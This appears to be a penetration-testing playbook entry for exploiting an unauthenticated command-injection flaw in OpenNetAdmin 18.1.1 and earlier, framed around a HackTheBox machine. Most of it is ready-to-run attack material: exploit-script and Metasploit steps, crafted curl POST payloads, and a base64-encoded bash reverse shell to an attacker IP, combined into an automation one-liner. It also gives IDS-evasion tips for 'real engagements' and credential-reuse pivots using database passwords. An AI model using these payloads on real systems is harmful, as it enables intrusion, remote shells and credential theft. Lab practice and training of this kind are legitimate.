# OpenNetAdmin (ONA) RCE — CVE-2019-17642

> Unauthenticated command injection in OpenNetAdmin ≤ 18.1.1's
> `local_modules.php`. The exploit is a one-liner; the *adaptation* of
> payloads through URL encoding is where time is spent.

## Objective
Achieve RCE as `www-data` on a host running OpenNetAdmin ≤ 18.1.1.

## When To Use
- Web app fingerprints as OpenNetAdmin (ONA) at any version ≤ 18.1.1.
- Default install path is typically `/ona/` or sometimes
  `/opennetadmin/`.

## Detection Indicators
- Page footer: "v18.1.1" or similar.
- HTML `<title>OpenNetAdmin</title>`.
- Redirect from `/music/` (or other gobuster-discovered alias) to
  `/ona/` (the OpenAdmin pattern).
- File path: `/opt/ona/www/`.

## Enumeration Strategy

```bash
curl -s http://<ip>/ona/ | grep -iE "version|powered|ona"
gobuster dir -u http://<ip>/ -w raft-medium-words.txt -x php,html
# look for /ona/ or alias paths

searchsploit opennetadmin
# 47691  OpenNetAdmin 18.1.1 - Remote Code Execution
```

## Exploitation Workflow

The Exploit-DB script (`47691.sh`) sends a POST to
`/ona/local/plugins/ona_xajax.php` (or `index.php` depending on the
PoC) with a crafted parameter. It gives a non-interactive command-shell
prompt.

```bash
# fetch + run
searchsploit -m 47691.sh
bash 47691.sh http://<ip>/ona/
ona-shell$ id
# uid=33(www-data)
```

For a stable shell:

```bash
# encode payload to bypass URL parser brittleness
echo -n 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' | base64
# c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQ==

# in the ONA shell (or via direct curl POST):
echo c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQ== | base64 -d | bash
```

> **IppSec key insight (per transcript)**: "The shell-style payload
> didn't work because special characters get mangled by the URL parser.
> Base64-encode the payload, then pipe through `base64 -d | bash` on
> the target."

Listener:
```bash
nc -lvnp 4444
```

## Commands

```bash
# manual curl exploitation (no script)
curl -s -X POST "http://<ip>/ona/" \
  -d "xajax=window_submit&xajaxr=1&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3B<encoded-cmd>%3B&xajaxargs[]=ping"
```

```bash
# Metasploit module
msfconsole -q
> use exploit/multi/http/opennetadmin_ping_cmd_injection
> set RHOSTS <ip>
> set TARGETURI /ona/
> set LHOST tun0
> set LPORT 4444
> run
```

## Tool Usage

- `47691.sh` — Exploit-DB script.
- Metasploit `exploit/multi/http/opennetadmin_ping_cmd_injection` —
  cleaner.
- `curl` — manual triggering.
- `base64` — payload encoding.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Raw payload with special chars | Exploit fires but no callback | Base64-encode the inner shell |
| Wrong target URI | "Vulnerable site not found" | `/ona/` is most common; fuzz if missing |
| Forgetting URL encoding for the *encoded* payload | Server rejects | curl's `--data-urlencode` |
| Listener on the wrong interface | No connect | bind to `tun0` |

## Decision-Making Logic

```
fingerprint = ONA ≤18.1.1
  └─ run 47691.sh → command shell (non-interactive)
       └─ need reverse shell:
            └─ base64-encode bash payload
                 └─ pipe through base64 -d | bash
                      └─ stabilise PTY
```

## Pivot Opportunities

ONA on a Linux host typically runs as `www-data`:
- ONA's database config (`/opt/ona/www/local/config/database_settings.inc.php`)
  contains a DB password — try as a system account.
- `/etc/passwd` lists other users — credential reuse target.

## OPSEC Considerations
- One POST per command is in access logs.
- Apache logs the requests in `/var/log/apache2/access.log`.
- IDS will likely catch `xajax=window_submit` patterns; add jitter
  on real engagements.

## Real HTB Examples

- **OpenAdmin** — full chain: gobuster → /ona/ → 47691.sh →
  encoding-fight reverse shell as www-data → DB config password reuse
  → Jimmy → Joanna → root via sudo nano.

## Alternative Techniques

- **CVE-2019-9263** — same product, slightly different vector.
- **Generic command injection in PHP `system()`** — many ONA plugins
  beyond `ona_xajax.php` are vulnerable; look at the codebase if the
  primary path is patched.

## Automation Opportunities

```bash
# combined: encode payload, fire, listener
nc -lvnp 4444 &
P=$(echo -n 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' | base64)
curl -s -X POST "http://<ip>/ona/" \
  --data-urlencode "xajax=window_submit" \
  --data-urlencode "xajaxr=1" \
  --data-urlencode "xajaxargs[]=tooltips" \
  --data-urlencode "xajaxargs[]=ip=;echo $P | base64 -d | bash;" \
  --data-urlencode "xajaxargs[]=ping"
```

## Checklist

- [ ] ONA version confirmed ≤ 18.1.1
- [ ] Exploit script obtained
- [ ] Listener ready
- [ ] Reverse shell payload base64-encoded
- [ ] Shell received, PTY stabilised
- [ ] DB config file pulled for credential reuse

## Related Skills

- [`web/url-encoding-bypass.md`](url-encoding-bypass.md)
- [`linux-privesc/credential-reuse.md`](../linux-privesc/credential-reuse.md)
- [`reverse-shells/bash-reverse-shell.md`](../reverse-shells/bash-reverse-shell.md)
- [`tool-usage/searchsploit.md`](../tool-usage/searchsploit.md)
- [`methodology/11-exploit-adaptation.md`](../methodology/11-exploit-adaptation.md)
